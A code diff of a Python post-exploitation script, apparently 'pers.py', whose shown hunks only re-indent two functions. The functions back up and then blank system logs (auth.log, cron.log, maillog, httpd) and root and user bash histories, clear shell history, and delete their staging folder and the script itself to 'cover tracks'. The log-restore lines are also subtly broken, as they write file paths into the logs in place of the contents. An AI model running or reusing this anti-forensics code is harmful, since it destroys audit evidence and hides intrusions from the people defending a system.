@@ -27,15 +27,15 @@ local_port = args.port
 def disable_hist():
 	print("\n### creating backups of log files... ###")
 	os.system("mkdir /tmp/.backups")
-        os.system("cp /var/log/auth.log /tmp/.backups/")
-        os.system("cp /var/log/cron.log /tmp/.backups/")
-        os.system("cp /var/log/maillog /tmp/.backups/")
-        os.system("cp /var/log/httpd /tmp/.backups/")
-        os.system("cp ~/.bash_history /tmp/.backups/")
-        os.system("cp /root/.bash_history /tmp/.backups/")
-        os.system("echo $history > /tmp/.backups/history")
-        os.system("history -c")
-        os.system("history -w")
+	os.system("cp /var/log/auth.log /tmp/.backups/")
+	os.system("cp /var/log/cron.log /tmp/.backups/")
+	os.system("cp /var/log/maillog /tmp/.backups/")
+	os.system("cp /var/log/httpd /tmp/.backups/")
+	os.system("cp ~/.bash_history /tmp/.backups/")
+	os.system("cp /root/.bash_history /tmp/.backups/")
+	os.system("echo $history > /tmp/.backups/history")
+	os.system("history -c")
+	os.system("history -w")
 
 
 # check for root permissions
@@ -99,28 +99,28 @@ def cron_make():
 
 # cover tracks and reestablish history logging
 def clear_tracks():
-        print("\n### clearing log files ###")
-        os.system("echo ' ' > /var/log/auth.log")
-        os.system("echo ' ' > /var/log/cron.log")
-        os.system("echo ' ' > /var/log/maillog")
-        os.system("echo ' ' > /var/log/httpd")
-        os.system("history -c")
-        os.system("history -w")
-        os.system("echo ' ' > ~/.bash_history")
-        os.system("echo ' ' > /root/.bash_history")
+	print("\n### clearing log files ###")
+	os.system("echo ' ' > /var/log/auth.log")
+	os.system("echo ' ' > /var/log/cron.log")
+	os.system("echo ' ' > /var/log/maillog")
+	os.system("echo ' ' > /var/log/httpd")
+	os.system("history -c")
+	os.system("history -w")
+	os.system("echo ' ' > ~/.bash_history")
+	os.system("echo ' ' > /root/.bash_history")
 
 		# placing old contents back into logs
-        os.system("echo /tmp/.backups/auth.log > /var/log/auth.log")
-        os.system("echo /tmp/.backups/cron.log > /var/log/cron.log")
-        os.system("echo /tmp/.backups/maillog > /var/log/maillog")
-        os.system("echo /tmp/.backups/httpd > /var/log/httpd")
-        os.system("echo /tmp/.backups/.bash_history > ~/.bash_history")
-        os.system("echo /tmp/.backups/.bash_history > /root/.bash_history")
-        os.system("echo /tmp/.backups/history > $history")
+	os.system("echo /tmp/.backups/auth.log > /var/log/auth.log")
+	os.system("echo /tmp/.backups/cron.log > /var/log/cron.log")
+	os.system("echo /tmp/.backups/maillog > /var/log/maillog")
+	os.system("echo /tmp/.backups/httpd > /var/log/httpd")
+	os.system("echo /tmp/.backups/.bash_history > ~/.bash_history")
+	os.system("echo /tmp/.backups/.bash_history > /root/.bash_history")
+	os.system("echo /tmp/.backups/history > $history")
 
-        print("\n### deleting data file and script... ###")
-        os.system("rm -rf /tmp/.backups")
-        os.system("rm -f pers.py")
+	print("\n### deleting data file and script... ###")
+	os.system("rm -rf /tmp/.backups")
+	os.system("rm -f pers.py")
 
 
 # call functions
